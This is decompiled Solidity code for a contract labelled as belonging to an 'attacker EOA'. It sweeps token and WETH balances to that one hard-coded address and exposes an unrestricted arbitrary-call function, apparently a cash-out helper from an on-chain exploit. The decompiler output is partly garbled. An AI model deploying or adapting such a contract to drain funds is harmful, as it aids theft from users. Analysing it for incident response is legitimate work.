// Decompiled by library.dedaub.com
// 2022.12.03 06:28 UTC



function claim(address[] varg0) public nonPayable { 
    v0 = v1 = 100;
    v2 = v3 = 0;
    require(msg.data.length - 4 >= 32v3, v3);
    require(varg0 <= 0xffffffffffffffffv3, v3);
    require(4 + varg0 + 31 < msg.data.lengthv3, v3);
    require(varg0.length <= 0xffffffffffffffff, Panic(65));
    v4 = v5 = MEM[64];
    require(!((v5 + (~0x1f & (varg0.length << 5) + 32 + 31) < v5) | (v5 + (~0x1f & (varg0.length << 5) + 32 + 31) > 0xffffffffffffffff)), Panic(65));
    MEM[64] = v5 + (~0x1f & (varg0.length << 5) + 32 + 31);
    MEM[v5] = varg0.length;
    v6 = v7 = v5 + 32;
    v8 = v9 = 36 + varg0;
    require(msg.data.length >= 32 + (4 + varg0 + (varg0.length << 5))v3, v3);
    while (v2 < varg0.length) {
        require(msg.data[v8] == address(msg.data[v8]));
        MEM[v6] = msg.data[v8];
        v2 += 1;
        v6 += 32;
        v8 += 32;
    }
    // attacker EOA
    require(0x6162759edad730152f0df8115c698a42e666157f == msg.sender);
    v10 = v11 = 0;
    while (v10 < MEM[v4]) {
        if (v10 < MEM[v4]) {
            break;
        }
        require(v10 < MEM[v4], Panic(50));
        if (address(MEM[32 + (v10 << 5) + v4]) != 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) {
            goto 0x250B0x5f;
        }
        if (address(MEM[32 + (v10 << 5) + v4]) == 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) {
        }
        MEM[MEM[64]] = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        MEM[4 + MEM[64]] = address(this);
        require((address(MEM[32 + (v10 << 5) + v4])).code.size);
        v12 = address(MEM[32 + (v10 << 5) + v4]).staticcall(MEM[(MEM[64]) len (36 + MEM[64] - MEM[64])], MEM[(MEM[64]) len 32]).gas(msg.gas);
        require(v12); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        if (MEM[MEM[64]]) {
            MEM[MEM[64]] = 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000;
            MEM[4 + MEM[64]] = MEM[MEM[64]];
            require(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.code.size);
            v13 = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.call(MEM[(MEM[64]) len (36 + MEM[64] - MEM[64])], MEM[(MEM[64]) len 0]).gas(msg.gas);
            require(v13); // checks call status, propagates error data on error
        }
        require(v10 != ~0, Panic(17));
        v10 += 1;
        continue;
        MEM[MEM[64]] = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        MEM[4 + MEM[64]] = address(this);
        require((address(MEM[32 + (v10 << 5) + v4])).code.size);
        v14 = address(MEM[32 + (v10 << 5) + v4]).staticcall(MEM[(MEM[64]) len (36 + MEM[64] - MEM[64])], MEM[(MEM[64]) len 32]).gas(msg.gas);
        require(v14); // checks call status, propagates error data on error
        MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 & ~0x1f);
        require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);
        v0 = MEM[MEM[64]];
        if (v0) {
            v4 = v15 = 747;
            v10 = v16 = address(MEM[32 + (v10 << 5) + v4]);
            MEM[36 + MEM[64]] = msg.sender;
            MEM[36 + MEM[64] + 32] = v0;
            MEM[64] += 100;
            MEM[MEM[64] + 32] = 0xa9059cbb00000000000000000000000000000000000000000000000000000000 | 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff & MEM[MEM[64] + 32];
            if (this.balance >= 0) {
                if ((address(v16)).code.size) {
                    v17 = v18 = 0;
                    while (v17 < 68) {
                        MEM[v17 + MEM[64]] = MEM[v17 + (MEM[64] + 32)];
                        v17 += 32;
                    }
                    if (v17 > 68) {
                        MEM[MEM[64] + 68] = 0;
                    }
                    v19 = address(v16).call(MEM[(MEM[64]) len 68], MEM[(MEM[64]) len 0]).gas(msg.gas);
                    if (RETURNDATASIZE() == 0) {
                        v20 = v21 = 96;
                    } else {
                        v20 = v22 = MEM[64];
                        MEM[64] = v22 + (RETURNDATASIZE() + 2633 & ~0x1f);
                        MEM[v22] = RETURNDATASIZE();
                        RETURNDATACOPY(v22 + 32, 0, RETURNDATASIZE());
                    }
                    if (!v19) {
                        require(!MEM[v20]32 + v20, MEM[v20]);
                        v23 = new array[](v24.length);
                        v25 = v26 = 0;
                        while (v25 < v24.length) {
                            v23[v25] = v24[v25];
                            v25 += 32;
                        }
                        if (v25 > v24.length) {
                            v23[v24.length] = 0;
                        }
                        revert(Error(v23, v27, 'SafeERC20: low-level call failed'));
                    } else {
                        if (MEM[v20]) {
                            require(32 + v20 + MEM[v20] - (32 + v20) >= 32);
                            require(MEM[32 + v20] == MEM[32 + v20]);
                            require(MEM[32 + v20], Error('SafeERC20: ERC20 operation did not succeed'));
                        }
                        goto 0x2ebB0x5f;
                    }
                }
            }
            revert(Error('Address: call to non-contract'));
        }
    }
    if (this.balance) {
        v28 = msg.sender.call().value(this.balance).gas(2300 * !this.balance);
        require(v28); // checks call status, propagates error data on error
    }
}

function WETH() public nonPayable { 
    return 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;
}

function exec(address varg0, bytes varg1) public nonPayable { 
    require(msg.data.length - 4 >= 64);
    require(varg0 == varg0);
    require(varg1 <= 0xffffffffffffffff);
    require(4 + varg1 + 31 < msg.data.length);
    require(varg1.length <= 0xffffffffffffffff, Panic(65));
    v0 = new bytes[](varg1.length);
    require(!((v0 + (~0x1f & 32 + (~0x1f & varg1.length + 31) + 31) < v0) | (v0 + (~0x1f & 32 + (~0x1f & varg1.length + 31) + 31) > 0xffffffffffffffff)), Panic(65));
    require(4 + varg1 + varg1.length + 32 <= msg.data.length);
    CALLDATACOPY(v0.data, 4 + varg1 + 32, varg1.length);
    v0[varg1.length] = 0;
    require(0x6162759edad730152f0df8115c698a42e666157f == msg.sender);
    v1 = v2 = 0;
    while (v1 < v0.length) {
        MEM[v1 + v3.data] = v0[v1];
        v1 += 32;
    }
    if (v1 > v0.length) {
        MEM[v3.data + v0.length] = 0;
    }
    v4, v5 = varg0.call(v3.data).gas(msg.gas);
    if (RETURNDATASIZE() != 0) {
        MEM[MEM[64]] = RETURNDATASIZE();
        RETURNDATACOPY(MEM[64] + 32, 0, RETURNDATASIZE());
    }
    return v4;
}

function () public payable { 
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        require(!msg.data.length);
        ();
    } else if (0x318d9e5d == function_selector >> 224) {
        claim(address[]);
    } else if (0xad5c4648 == function_selector >> 224) {
        WETH();
    } else {
        require(0xbe6002c2 == function_selector >> 224);
        exec(address,bytes);
    }
}
